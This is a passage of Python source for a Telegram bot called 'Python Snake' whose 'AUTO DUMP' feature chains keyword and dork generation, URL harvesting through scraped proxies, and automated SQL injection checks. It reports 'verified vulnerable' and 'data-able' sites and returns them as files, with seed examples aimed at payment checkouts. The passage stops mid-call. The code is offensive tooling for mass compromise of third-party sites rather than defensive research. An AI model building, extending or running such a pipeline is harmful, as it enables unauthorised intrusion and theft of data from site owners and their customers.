                    format(st["dataable"], ","), format(st["skipped"], ","),
                    st["min_conf"], st.get("elapsed", 0.0), st["threads"], extra))
    except Exception:
        pass
    for p, cap in ((res["path"], "💀 %s verified vulnerable URLs" % format(st["vulns"], ",")),
                   (res.get("report_path"), "📊 Full SQLi report (DBMS + confidence)")):
        if not p or not st["vulns"]:
            continue
        try:
            with open(p, "rb") as fh:
                await context.bot.send_document(chat_id=chat_id, document=fh,
                                                filename=os.path.basename(p), caption=cap)
        except Exception:
            pass
    return MENU


# ═══════════════════════════════════════════════════════════════════════════════
#  PART 6 — AUTO DUMP (1-tap full chain)
# ═══════════════════════════════════════════════════════════════════════════════
def _v22_report_text(seeds, scale, kw, dorks, pst, sst, vulns, elapsed) -> str:
    top_dom = ""
    return (
        "🐍 <b>PYTHON SNAKE — AUTO DUMP REPORT</b> 🐍\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "🎯 <b>Seeds:</b> <code>%s</code>\n"
        "🎚 <b>Scale:</b> <code>%s</code>\n\n"
        "🧠 <b>Keywords:</b> <code>%s</code>\n"
        "🎯 <b>Dorks:</b> <code>%s</code>\n"
        "🌍 <b>URLs scanned:</b> <code>%s/%s</code> dorks\n"
        "🔗 <b>Raw URLs:</b> <code>%s</code>\n"
        "💎 <b>Unique:</b> <code>%s</code>\n"
        "🎯 <b>?param= URLs:</b> <code>%s</code>\n"
        "🌐 <b>Wayback:</b> <code>%s</code> • <b>CC:</b> <code>%s</code>\n\n"
        "🛡️ <b>SQLi tested:</b> <code>%s</code>\n"
        "✅ <b>Confirmed vulns:</b> <code>%s</code>\n"
        "🗄️ <b>Data-able:</b> <code>%s</code>\n"
        "🚫 <b>Fake/static skip:</b> <code>%s</code>\n\n"
        "⏱ <b>Total time:</b> <code>%.1fs</code>\n"
        "📦 <i>Files: keywords • dorks • URLs • param • vulns • report</i>"
    ) % (
        (", ".join(seeds[:4]) + ("…" if len(seeds) > 4 else ""))[:80], scale,
        format(len(kw), ","), format(len(dorks), ","),
        format(pst.get("scanned", 0), ","), format(pst.get("total", 0), ","),
        format(pst.get("raw", 0), ","), format(pst.get("unique", 0), ","),
        format(pst.get("param", 0), ","),
        format(pst.get("cdx", 0), ","), format(pst.get("cc", 0), ","),
        format(sst.get("scanned", 0), ","), format(sst.get("vulns", 0), ","),
        format(sst.get("dataable", 0), ","), format(sst.get("skipped", 0), ","),
        elapsed,
    )


async def _v22_auto_run(update, context, seeds: list, scale: str = "standard") -> int:
    uid = update.effective_user.id
    chat_id = update.effective_chat.id
    sc = _V22_SCALES.get(scale) or _V22_SCALES["standard"]
    ev = asyncio.Event()
    _V19_STOP[int(uid)] = ev
    t0 = time.time()
    msg = await context.bot.send_message(
        chat_id=chat_id,
        text="🐍 <b>PYTHON SNAKE — AUTO DUMP</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
             "🎚 Scale: <code>%s</code>\n\n⏳ Phase 1/4 — keywords ban rahe hain…" % scale.upper(),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Sᴛᴏᴘ", callback_data="v19_stop")]]),
    )
    mid = msg.message_id
    last = {"t": 0.0}

    async def _say(txt: str) -> None:
        try:
            await context.bot.edit_message_text(chat_id=chat_id, message_id=mid,
                                                text=txt, parse_mode=ParseMode.HTML)
        except Exception:
            pass

    # ---- 1. keywords ----
    try:
        kw = _v19_make_keywords(seeds, sc["kw"])
    except Exception:
        kw = list(seeds)[: sc["kw"]]
    # ---- 2. dorks (universal) ----
    niche = _v22_detect_niche(kw)
    await _say("🐍 <b>AUTO DUMP</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
               "✅ 1/4 Keywords: <code>%s</code>\n"
               "🧬 Niche detect: <code>%s</code>\n"
               "⏳ Phase 2/4 — dorks ban rahe hain…" % (format(len(kw), ","), niche.upper()))
    try:
        dorks = _v22_universal_dorks(kw, sc["dorks"], niche=niche)
    except Exception:
        dorks = []
    if not dorks:
        await _say("❌ Dorks generate nahi huye — dobara try karo.")
        _V19_STOP.pop(int(uid), None)
        return MENU

    # ---- 3. parse ----
    await _say("🐍 <b>AUTO DUMP</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
               "✅ 1/4 Keywords: <code>%s</code>\n"
               "✅ 2/4 Dorks: <code>%s</code>\n"
               "⏳ Phase 3/4 — URLs parse ho rahe hain…" % (format(len(kw), ","), format(len(dorks), ",")))

    async def _pprog(s: dict) -> None:
        now = time.time()
        if now - last["t"] < 3.0:
            return
        last["t"] = now
        pct = s.get("scanned", 0) * 100.0 / max(1, s.get("total", 1))
        await _say(
            "🐍 <b>AUTO DUMP — PARSING</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            "✅ Keywords: <code>%s</code> • Dorks: <code>%s</code>\n"
            "📥 <b>Done:</b> <code>%s/%s</code>\n"
            "💎 <b>Unique:</b> <code>%s</code> • 🎯 <code>%s</code>\n"
            "⚡ <b>%s dorks/s</b> • 🌊 %s\n\n<code>[%s]</code> <b>%d%%</b> • ETA <code>%ss</code>"
            % (format(len(kw), ","), format(len(dorks), ","),
               format(s.get("scanned", 0), ","), format(s.get("total", 1), ","),
               format(s.get("unique", 0), ","), format(s.get("param", 0), ","),
               s.get("tps", 0), s.get("phase", ""),
               _v19_bar(pct), int(pct), s.get("eta", 0)))

    try:
        pres = await _v19_deep_parse(dorks, uid, progress=_pprog)
    except Exception as exc:
        logger.exception("auto dump parse failed: %s", exc)
        await _say("❌ Parse me error: <code>%s</code>" % str(exc)[:200])
        _V19_STOP.pop(int(uid), None)
        return MENU
    pst = pres["stats"]

    # param urls file se padho (cap by scale)
    param_urls = []
    try:
        with open(pres["param_path"], "r", encoding="utf-8", errors="ignore") as f:
            for ln in f:
                ln = ln.strip()
                if ln:
                    param_urls.append(ln)
                if len(param_urls) >= sc["urls"]:
                    break
    except Exception:
        pass

    # ---- 4. sqli verify ----
    sst = {"scanned": 0, "total": len(param_urls), "vulns": 0, "dataable": 0, "skipped": 0}
    sres = {"path": "", "report_path": "", "hits": []}
    if param_urls and not ev.is_set():
        await _say("🐍 <b>AUTO DUMP — VERIFYING</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                   "✅ URLs: <code>%s</code> unique\n"
                   "⏳ Phase 4/4 — SQLi verify ho raha hai (<code>%s</code> URLs)…"
                   % (format(pst.get("unique", 0), ","), format(len(param_urls), ",")))

        async def _sprog(s: dict) -> None:
            now = time.time()
            if now - last["t"] < 3.0:
                return
            last["t"] = now
            pct = s.get("scanned", 0) * 100.0 / max(1, s.get("total", 1))
            await _say(
                "🐍 <b>AUTO DUMP — SQLi VERIFY</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                "📥 <b>Tested:</b> <code>%s/%s</code>\n"
                "✅ <b>Confirmed:</b> <code>%s</code>\n"
                "🗄️ <b>Data-able:</b> <code>%s</code>\n\n<code>[%s]</code> <b>%d%%</b>"
                % (format(s.get("scanned", 0), ","), format(s.get("total", 1), ","),
                   format(s.get("confirmed", 0), ","), format(s.get("dataable", 0), ","),
                   _v19_bar(pct), int(pct)))

        try:
            sres = await _v19_sqli_scan(param_urls, uid, progress=_sprog,
                                        fast=(scale == "quick"))
            sst = sres["stats"]
        except Exception as exc:
            logger.warning("auto dump sqli failed: %s", exc)

    elapsed = time.time() - t0
    # ---- report ----
    rep_txt = _v22_report_text(seeds, scale, kw, dorks, pst, sst, sres.get("hits", []), elapsed)
    await _say(rep_txt)

    # ---- files ----
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    files = []
    try:
        kpath = os.path.join(_V19_OUT_DIR, "AUTO_Keywords_%s.txt" % ts)
        with open(kpath, "w", encoding="utf-8") as f:
            f.write("\n".join(kw) + "\n")
        files.append((kpath, "🧠 %s keywords" % format(len(kw), ",")))
    except Exception:
        pass
    try:
        dpath = os.path.join(_V19_OUT_DIR, "AUTO_Dorks_%s.txt" % ts)
        with open(dpath, "w", encoding="utf-8") as f:
            f.write("\n".join(dorks) + "\n")
        files.append((dpath, "🎯 %s dorks" % format(len(dorks), ",")))
    except Exception:
        pass
    files.append((pres.get("all_path"), "🌍 All unique URLs"))
    files.append((pres.get("param_path"), "🎯 ?param= URLs"))
    if sst.get("vulns"):
        files.append((sres.get("path"), "💀 %s verified vulns" % format(sst["vulns"], ",")))
        files.append((sres.get("report_path"), "📊 SQLi report"))
    try:
        rpath = os.path.join(_V19_OUT_DIR, "AUTO_REPORT_%s.md" % ts)
        with open(rpath, "w", encoding="utf-8") as f:
            f.write("# PYTHON SNAKE — AUTO DUMP REPORT\n\n")
            f.write("- Seeds: %s\n- Scale: %s\n- Niche: %s\n" % (", ".join(seeds[:10]), scale, niche))
            f.write("- Keywords: %s\n- Dorks: %s\n" % (len(kw), len(dorks)))
            f.write("- Dorks scanned: %s/%s\n" % (pst.get("scanned", 0), pst.get("total", 0)))
            f.write("- Raw URLs: %s\n- Unique: %s\n- Param URLs: %s\n"
                    % (pst.get("raw", 0), pst.get("unique", 0), pst.get("param", 0)))
            f.write("- Wayback: %s\n- CommonCrawl: %s\n" % (pst.get("cdx", 0), pst.get("cc", 0)))
            f.write("- SQLi tested: %s\n- Confirmed: %s\n- Data-able: %s\n\n"
                    % (sst.get("scanned", 0), sst.get("vulns", 0), sst.get("dataable", 0)))
            f.write("## Verified vulnerable URLs\n\n")
            for u, db in (sres.get("hits") or []):
                f.write("- `%s` — %s\n" % (u, db))
        files.append((rpath, "📄 Full report (MD)"))
    except Exception:
        pass

    for p, cap in files:
        if not p or not os.path.isfile(p):
            continue
        try:
            with open(p, "rb") as fh:
                await context.bot.send_document(chat_id=chat_id, document=fh,
                                                filename=os.path.basename(p), caption=cap)
        except Exception:
            pass
        await asyncio.sleep(0.4)
    _V19_STOP.pop(int(uid), None)
    return MENU


# ═══════════════════════════════════════════════════════════════════════════════
#  PART 7 — UI (branding + new sections + cleanup)
# ═══════════════════════════════════════════════════════════════════════════════
def _v19_panel_text() -> str:   # noqa: F811
    cf = _v21_cfg()
    hw = _V19_HW
    dev = "📱 Termux" if hw["termux"] else "🖥️ VPS"
    proxies = len(_v22_good_proxies(0))
    return (
        "🐍 <b>PYTHON SNAKE ENGINE</b> 🐍\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔥 <b>{len(_V19_ENGINES)} engines</b> • Wayback {'ON' if cf['use_cdx'] else 'OFF'} • "
        f"CC {'ON' if cf['use_cc'] else 'OFF'}\n"
        f"🧅 <b>Proxies:</b> <code>{proxies or 'direct'}</code>\n\n"
        f"🎚 <b>Mode:</b> <code>{cf['mode'].upper()}</code> (fanout {cf['fanout']})\n"
        f"⚡ <b>Threads:</b> <code>{cf['threads']}</code> • 📄 Pages: <code>{cf['pages']}</code>\n"
        f"🎯 <b>Sig limit:</b> <code>{cf['sig']}</code>\n"
        f"💻 <b>{dev}</b> • {hw['cores']} cores / {hw['ram']} GB\n\n"
        "<i>Choose your weapon ⬇️</i>"
    )


def _v19_panel_kb():   # noqa: F811
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🐍 AUTO DUMP (1-Tap)", callback_data="v22_auto")],
        [InlineKeyboardButton("🧠 Kᴇʏᴡᴏʀᴅ Mᴀᴋᴇʀ", callback_data="v19_kw"),
         InlineKeyboardButton("🎯 Dᴏʀᴋ Gᴇɴ", callback_data="v19_dork")],
        [InlineKeyboardButton("🧬 Uɴɪᴠᴇʀsᴀʟ Dᴏʀᴋs", callback_data="v22_uni")],
        [InlineKeyboardButton("🌍 Dᴇᴇᴘ Pᴀʀsᴇʀ ⚡", callback_data="v19_parse"),
         InlineKeyboardButton("🛡️ SQLi Cʜᴇᴄᴋᴇʀ", callback_data="v19_sqli")],
        [InlineKeyboardButton("🧅 Pʀᴏxʏ Sᴄᴀɴ", callback_data="v22_proxy_scan"),
         InlineKeyboardButton("⚙️ Sᴇᴛᴛɪɴɢs", callback_data="v19_cfg")],
        [InlineKeyboardButton("🐍 Bʀᴀɴᴅ / Lᴏɢᴏ", callback_data="v22_brand"),
         InlineKeyboardButton("⬅️ Bᴀᴄᴋ", callback_data="menu_back")],
    ])


def _v19_cfg_kb():   # noqa: F811
    cf = _v21_cfg()
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(("✅ " if cf["mode"] == "fast" else "") + "🚀 Fast", callback_data="v21_mode_fast"),
         InlineKeyboardButton(("✅ " if cf["mode"] == "balanced" else "") + "⚖️ Bal", callback_data="v21_mode_balanced")],
        [InlineKeyboardButton(("✅ " if cf["mode"] == "deep" else "") + "🌊 Deep", callback_data="v21_mode_deep"),
         InlineKeyboardButton(("✅ " if cf["mode"] == "max" else "") + "🔥 Max", callback_data="v21_mode_max")],
        [InlineKeyboardButton("🟢 24", callback_data="v19_thr_24"),
         InlineKeyboardButton("🟡 40", callback_data="v19_thr_40"),
         InlineKeyboardButton("🟠 60", callback_data="v19_thr_60")],
        [InlineKeyboardButton("🔵 100", callback_data="v19_thr_100"),
         InlineKeyboardButton("🔥 160", callback_data="v19_thr_160"),
         InlineKeyboardButton("⚡ Auto", callback_data="v19_thr_0")],
        [InlineKeyboardButton("📄 1", callback_data="v19_pg_1"),
         InlineKeyboardButton("📄 2", callback_data="v19_pg_2"),
         InlineKeyboardButton("📄 3", callback_data="v19_pg_3")],
        [InlineKeyboardButton(("🌐 Wayback " + ("ON" if cf["use_cdx"] else "OFF")), callback_data="v21_cdx_toggle"),
         InlineKeyboardButton(("🧠 CC " + ("ON" if cf["use_cc"] else "OFF")), callback_data="v21_cc_toggle")],
        [InlineKeyboardButton("🎯 Sig: %s" % (cf["sig"] or "off"), callback_data="v21_sig_cycle")],
        [InlineKeyboardButton("🧅 Proxy Scan", callback_data="v22_proxy_scan")],
        [InlineKeyboardButton("🔙 Bᴀᴄᴋ", callback_data="menu_v19")],
    ])


# ── main menu (branded + cleaned) ───────────────────────────────────────────
_V22_HIDDEN = (
    # v22 ne inko supersede kar diya (AUTO DUMP / engine panel)
    "menu_kw_checker", "menu_ai_kw_parser", "menu_keywords", "menu_dorks",
    "menu_hqdorks", "menu_countrydorks", "menu_cmsdorks", "menu_exposeddorks",
    "menu_autopilot", "menu_refinery", "menu_source",
    # duplicate/legacy dork-parse-dump buttons — ab ek hi pipeline hai
    "menu_adorks", "menu_parser", "menu_sqli", "menu_alldump",
    "menu_dump", "menu_urldump",
)
_V22_SHOW_CLASSIC = {"on": False}

_v22_prev_make_main_menu = make_main_menu


def make_main_menu():   # noqa: F811
    try:
        base = _v22_prev_make_main_menu()
        rows = list(base.inline_keyboard)
    except Exception:
        return _v22_prev_make_main_menu()
    if not _V22_SHOW_CLASSIC["on"]:
        rows = [r for r in rows
                if not any(getattr(b, "callback_data", "") in _V22_HIDDEN for b in r)]
    have = {getattr(b, "callback_data", "") for r in rows for b in r}
    new_top = []
    if "v22_auto" not in have:
        new_top.append([InlineKeyboardButton("🐍 AUTO DUMP — 1 TAP FULL CHAIN", callback_data="v22_auto")])
    if "v22_uni" not in have:
        new_top.append([InlineKeyboardButton("🧬 UNIVERSAL DORK ENGINE", callback_data="v22_uni")])
    if "v22_proxy_scan" not in have:
        new_top.append([InlineKeyboardButton("🧅 PROXY SCAN + AUTO-FILL", callback_data="v22_proxy_scan")])
    rows = new_top + rows
    # brand the engine button
    fixed = []
    for r in rows:
        nr = []
        for b in r:
            if getattr(b, "callback_data", "") == "menu_v19":
                nr.append(InlineKeyboardButton("🐍 PYTHON SNAKE ENGINE ⚡", callback_data="menu_v19"))
            else:
                nr.append(b)
        fixed.append(nr)
    try:
        return InlineKeyboardMarkup(fixed)
    except Exception:
        return base


def _v22_wrap_admin_menu(fn):
    def _inner():
        kb = fn()
        try:
            rows = []
            for r in kb.inline_keyboard:
                nr = []
                for b in r:
                    if "[V18-TITAN]" in (b.text or ""):
                        nr.append(InlineKeyboardButton("☢️ FORCE KILL ALL TASKS [PYTHON-SNAKE]",
                                                       callback_data=b.callback_data))
                    else:
                        nr.append(b)
                rows.append(nr)
            return InlineKeyboardMarkup(rows)
        except Exception:
            return kb
    return _inner


make_admin_menu = _v22_wrap_admin_menu(make_admin_menu)


# ── callbacks ───────────────────────────────────────────────────────────────
async def _v22_proxy_scan_ui(update, context) -> int:
    q = update.callback_query
    chat_id = update.effective_chat.id
    try:
        await q.answer("🧅 Proxy scan shuru…")
    except Exception:
        pass
    msg = await context.bot.send_message(
        chat_id=chat_id,
        text="🧅 <b>PROXY SCAN</b>\n━━━━━━━━━━━━━━━━━━━━━\n⏳ 50+ sources scrape ho rahe hain…",
        parse_mode=ParseMode.HTML)
    mid = msg.message_id
    last = {"t": 0.0}

    async def _prog(s: dict) -> None:
        now = time.time()
        if now - last["t"] < 3.0:
            return
        last["t"] = now
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id, message_id=mid, parse_mode=ParseMode.HTML,
                text=("🧅 <b>PROXY SCAN — RUNNING</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                      "📡 <b>Scraped:</b> <code>%s</code>\n"
                      "🔬 <b>Checked:</b> <code>%s</code>\n"
                      "✅ <b>Alive:</b> <code>%s</code>\n"
                      "🌊 <b>Pool:</b> <code>%s</code>")
                     % (format(s.get("scraped", 0), ","), format(s.get("checked", 0), ","),
                        format(s.get("alive", 0), ","), format(s.get("pool", 0), ",")))
        except Exception:
            pass

    want = 150 if _V19_HW["termux"] else 400
    try:
        st = await _v22_proxy_scan(want=want, progress=_prog, force=True)
    except Exception as exc:
        await context.bot.edit_message_text(chat_id=chat_id, message_id=mid,
                                            text="❌ Proxy scan fail: <code>%s</code>" % str(exc)[:200],
                                            parse_mode=ParseMode.HTML)
        return MENU
    if st.get("pool", 0) == 0:
        txt = ("🧅 <b>PROXY SCAN — 0 ALIVE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
               "📡 Scraped: <code>%s</code>\n🔬 Checked: <code>%s</code>\n\n"
               "😕 Internet ya proxy sources down hain.\n\n"
               "💡 <b>Bina proxy bhi kaam chalega:</b>\n"
               "• Parser ab Wayback + CommonCrawl + safe engines pe chalta hai\n"
               "• Bas <b>Deep Parser</b> chalao — 0 URLs nahi aayenge\n"
               "• Ya apni paid proxy daalo: <code>/setpr host:port:user:pass</code>")
    else:
        txt = ("🧅 <b>PROXY SCAN — DONE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
               "📡 <b>Scraped:</b> <code>%s</code>\n"
               "🔬 <b>Checked:</b> <code>%s</code>\n"
               "✅ <b>Alive (pool):</b> <code>%s</code>\n"
               "⚡ <b>Best latency:</b> <code>%sms</code>\n"
               "⏱ <code>%.1fs</code>\n\n"
               "<i>Ab parser inhe khud use karega 🐍</i>")
    try:
        await context.bot.edit_message_text(
            chat_id=chat_id, message_id=mid, parse_mode=ParseMode.HTML,
            text=txt % (format(st.get("scraped", 0), ","), format(st.get("checked", 0), ","))
            + (("" if st.get("pool", 0) == 0 else "") if False else ""),
        )
    except Exception:
        pass
    return MENU


async def _v22_handle(update, context, data: str) -> int:
    q = update.callback_query
    uid = update.effective_user.id
    if data == "v22_auto":
        if not has_access(uid):
            await q.answer("🔒 Access needed", show_alert=True)
            return MENU
        await q.answer()
        await q.edit_message_text(
            "🐍 <b>AUTO DUMP — 1 TAP</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            "Keywords se lekar verified vulnerable URLs tak — sab automatic.\n\n"
            "🎚 <b>Scale chuno:</b>\n"
            "• ⚡ Quick — 300 kw / 1.5k dorks / 250 URL check\n"
            "• ⚖️ Standard — 1k kw / 10k dorks / 1.2k URL check\n"
            "• 🌊 Deep — 3k kw / 40k dorks / 4k URL check",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⚡ Quick", callback_data="v22_auto_quick")],
                [InlineKeyboardButton("⚖️ Standard", callback_data="v22_auto_standard")],
                [InlineKeyboardButton("🌊 Deep", callback_data="v22_auto_deep")],
                [InlineKeyboardButton("⬅️ Back", callback_data="menu_v19")],
            ]), parse_mode=ParseMode.HTML)
        return MENU
    if data.startswith("v22_auto_"):
        scale = data.split("v22_auto_", 1)[1]
        if scale not in _V22_SCALES:
            scale = "standard"
        _V19_DEFAULT_CFG["auto_scale"] = scale
        try:
            _v19_save_cfg({"auto_scale": scale})
        except Exception:
            pass
        context.user_data["v19_mode"] = "auto_seeds"
        context.user_data["v22_scale"] = scale
        await q.answer()
        await q.edit_message_text(
            "🐍 <b>AUTO DUMP — %s</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            "📥 <b>Seeds bhejo</b> (niche / brand / keyword):\n\n"
            "• <code>stripe checkout, gaming topup</code>\n"
            "• ya <code>.txt</code> file (ek seed per line)\n\n"
            "🐍 <i>Phir sab automatic: keywords → dorks → URLs → SQLi → report</i>" % scale.upper(),
            reply_markup=back_button(), parse_mode=ParseMode.HTML)
        return KW_WAIT_SEEDS
    if data == "v22_uni":
        if not has_access(uid):
            await q.answer("🔒 Access needed", show_alert=True)
            return MENU
        await q.answer()
        await q.edit_message_text(
            "🧬 <b>UNIVERSAL DORK ENGINE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            "Templates CC ke liye fix nahi — keywords dekh kar <b>khud</b> banate hain:\n"
            "• 40+ params • 35+ pages • 8 extensions • 10 niche families\n"
            "• API / AJAX / admin / panel endpoints auto\n\n"
            "🎚 <b>Kitne dorks?</b>",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("5,000", callback_data="v22_uni_5000"),
                 InlineKeyboardButton("20,000", callback_data="v22_uni_20000")],
                [InlineKeyboardButton("50,000", callback_data="v22_uni_50000"),
                 InlineKeyboardButton("1,00,000", callback_data="v22_uni_100000")],
                [InlineKeyboardButton("⬅️ Back", callback_data="menu_v19")],
            ]), parse_mode=ParseMode.HTML)
        return MENU
    if data.startswith("v22_uni_"):
        try:
            n = int(data.split("v22_uni_", 1)[1])
        except Exception:
            n = 20000
        context.user_data["v19_mode"] = "uni_kw"
        context.user_data["v22_count"] = n
        await q.answer()
        await q.edit_message_text(
            "🧬 <b>UNIVERSAL DORKS — %s</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            "📥 Keywords bhejo (text ya <code>.txt</code>)\n\n"
            "<i>Jitne bhi keywords, engine khud niche samajh kar templates banayega.</i>"
            % format(n, ","),
            reply_markup=back_button(), parse_mode=ParseMode.HTML)
        return KW_WAIT_SEEDS
    if data == "v22_proxy_scan":
        return await _v22_proxy_scan_ui(update, context)
    if data == "v22_brand":
        await q.answer()
        sent = False
        try:
            pth = _v22_logo_path()
            if pth:
                with open(pth, "rb") as fh:
                    await q.message.reply_photo(fh, caption=_v22_brand_text(),
                                                parse_mode=ParseMode.HTML)
                sent = True
        except Exception:
            sent = False
        if not sent:
            try:
                await q.message.reply_text(_v22_brand_text(), parse_mode=ParseMode.HTML)
            except Exception:
                pass
        return MENU
    if data == "v22_classic":
        _V22_SHOW_CLASSIC["on"] = not _V22_SHOW_CLASSIC["on"]
        await q.answer("Classic menu %s" % ("ON" if _V22_SHOW_CLASSIC["on"] else "OFF"))
        await q.edit_message_text("🐍 Menu updated:", reply_markup=make_main_menu())
        return MENU
    return MENU


_v22_prev_router = _v19_callback_router


async def _v19_callback_router(update, context, data: str) -> int:   # noqa: F811
    if data.startswith("v22_"):
        try:
            return await _v22_handle(update, context, data)
        except Exception as exc:
            logger.warning("v22 callback error: %s", exc)
            return MENU
    if data == "menu_v19":
        # router ko v22 panel dikhane do
        try:
            await update.callback_query.answer()
        except Exception:
            pass
        if not has_access(update.effective_user.id):
            try:
                await update.callback_query.answer("❌ Access Denied", show_alert=True)
            except Exception:
                pass
            return MENU
        q = update.callback_query
        try:
            await q.edit_message_text(_v19_panel_text(), reply_markup=_v19_panel_kb(),
                                      parse_mode=ParseMode.HTML)
        except Exception:
            try:
                await q.message.reply_text(_v19_panel_text(), reply_markup=_v19_panel_kb(),
                                           parse_mode=ParseMode.HTML)
            except Exception:
                pass
        return MENU
    return await _v22_prev_router(update, context, data)


# ── text-input modes ────────────────────────────────────────────────────────
_v22_prev_dispatch = _v19_dispatch


async def _v19_dispatch(mode: str, update, context) -> int:   # noqa: F811
    if mode == "auto_seeds":
        msg = update.effective_message
        seeds = _v19_read_input(msg)
        if getattr(msg, "document", None):
            try:
                note = await msg.reply_text("📥 File padh raha hoon…")
                try:
                    await _v19_download_doc(update, context)
                except Exception:
                    pass
                seeds = _v19_read_input(msg) or seeds
                try:
                    await note.delete()
                except Exception:
                    pass
            except Exception:
                pass
        seeds = [s for s in seeds if s][:60]
        if not seeds:
            await msg.reply_text("❌ Koi seed nahi mila — dobara bhejo (text ya .txt).")
            return MENU
        scale = context.user_data.get("v22_scale") or "standard"
        return await _v22_auto_run(update, context, seeds, scale)

    if mode == "uni_kw":
        msg = update.effective_message
        kws = _v19_read_input(msg)
        if getattr(msg, "document", None):
            try:
                await _v19_download_doc(update, context)
                kws = _v19_read_input(msg) or kws
            except Exception:
                pass
        kws = [k for k in kws if k][:400]
        if not kws:
            await msg.reply_text("❌ Keywords nahi mile — dobara bhejo.")
            return MENU
        n = int(context.user_data.get("v22_count") or 20000)
        niche = _v22_detect_niche(kws)
        note = await msg.reply_text("🧬 <b>Universal dorks ban rahe hain…</b>\n🎭 Niche: <code>%s</code>"
                                    % niche.upper(), parse_mode=ParseMode.HTML)
        dorks = _v22_universal_dorks(kws, n, niche=niche)
        path = os.path.join(_V19_OUT_DIR, "UniversalDorks_%s_%s.txt" % (
            len(dorks), datetime.now().strftime("%Y%m%d_%H%M%S")))
        try:
            with open(path, "w", encoding="utf-8") as f:
                f.write("\n".join(dorks) + "\n")
        except Exception:
            pass
        try:
            await note.edit_text(
                "🧬 <b>UNIVERSAL DORKS READY</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                "🎭 <b>Niche:</b> <code>%s</code>\n"
                "🎯 <b>Dorks:</b> <code>%s</code> (unique)\n"
                "🧠 <b>Keywords:</b> <code>%s</code>\n\n"
                "👉 Ab <b>Deep Parser</b> me isse daal do."
                % (niche.upper(), format(len(dorks), ","), format(len(kws), ",")),
                parse_mode=ParseMode.HTML)
        except Exception:
            pass
        try:
            with open(path, "rb") as fh:
                await context.bot.send_document(chat_id=update.effective_chat.id, document=fh,
                                                filename=os.path.basename(path),
                                                caption="🧬 %s universal dorks" % format(len(dorks), ","))
        except Exception:
            pass
        return MENU

    return await _v22_prev_dispatch(mode, update, context)


async def _v19_download_doc(update, context) -> None:
    """Document ko lines me convert karke cache me daal (agar pehle se nahi hai)."""
    msg = update.effective_message
    doc = getattr(msg, "document", None)
    if not doc:
        return
    fid = getattr(doc, "file_id", "") or ""
    if fid and _V19_DOC_CACHE.get(fid):
        return
    try:
        tg_file = await context.bot.get_file(fid)
        data = await tg_file.download_as_bytearray()
        raw = bytes(data)
        text = raw.decode("utf-8", errors="ignore")
        lines = [ln.strip() for ln in text.replace(",", "\n").splitlines() if ln.strip()]
        _v19_cache_doc(fid, lines[:200000])
    except Exception:
        pass


# ── commands ────────────────────────────────────────────────────────────────
async def _v22_proxyscan_cmd(update, context) -> None:
    if not has_access(update.effective_user.id):
        await update.effective_message.reply_text(access_denied_text(), reply_markup=access_denied_kb(),
                                                  parse_mode=ParseMode.MARKDOWN)
        return
    class _Shim:
        callback_query = None
        effective_user = update.effective_user
        effective_chat = update.effective_chat
    msg = update.effective_message
    note = await msg.reply_text("🧅 <b>PROXY SCAN</b>\n⏳ sources scrape ho rahe hain…",
                                parse_mode=ParseMode.HTML)
    want = 150 if _V19_HW["termux"] else 400
    try:
        st = await _v22_proxy_scan(want=want, force=True)
    except Exception as exc:
        await note.edit_text("❌ Proxy scan fail: <code>%s</code>" % str(exc)[:200],
                             parse_mode=ParseMode.HTML)
        return
    if st.get("pool", 0):
        await note.edit_text(
            "🧅 <b>PROXY POOL READY</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            "✅ <b>Alive:</b> <code>%s</code>\n⚡ <b>Best:</b> <code>%sms</code>\n"
            "📡 Scraped: <code>%s</code> • Checked: <code>%s</code>\n⏱ <code>%.1fs</code>"
            % (format(st["pool"], ","), st.get("best_ms", "?"),
               format(st.get("scraped", 0), ","), format(st.get("checked", 0), ","),
               st.get("elapsed", 0)),
            parse_mode=ParseMode.HTML)
    else:
        await note.edit_text(
            "🧅 <b>0 PROXIES</b>\n\nFree sources down hain ya internet issue.\n"
            "💡 <b>Bina proxy bhi chalega</b> — Deep Parser Wayback + CC + safe engines use karta hai.\n"
            "Ya apni proxy daalo: <code>/setpr host:port:user:pass</code>",
            parse_mode=ParseMode.HTML)


async def _v22_proxystat_cmd(update, context) -> None:
    if not has_access(update.effective_user.id):
        await update.effective_message.reply_text(access_denied_text(), reply_markup=access_denied_kb(),
                                                  parse_mode=ParseMode.MARKDOWN)
        return
    pool = _v22_proxy_load()
    mine = len(user_proxies.get(update.effective_user.id) or [])
    if not pool:
        await update.effective_message.reply_text(
            "🧅 <b>PROXY POOL — KHALI</b>\n\n<code>/proxyscan</code> se bharo\n"
            "ya <code>/setpr host:port:user:pass</code>", parse_mode=ParseMode.HTML)
        return
    ms = sorted(int(v.get("ms") or 9999) for v in pool.values())
    fast = sum(1 for m in ms if m < 1500)
    await update.effective_message.reply_text(
        "🧅 <b>PROXY POOL</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
        "✅ <b>Alive:</b> <code>%s</code>\n"
        "⚡ <b>Fast (&lt;1.5s):</b> <code>%s</code>\n"
        "🏃 <b>Best:</b> <code>%sms</code> • 🐢 <b>Worst:</b> <code>%sms</code>\n"
        "🙋 <b>Your own:</b> <code>%s</code>"
        % (format(len(pool), ","), format(fast, ","), ms[0] if ms else "?",
           ms[-1] if ms else "?", mine),
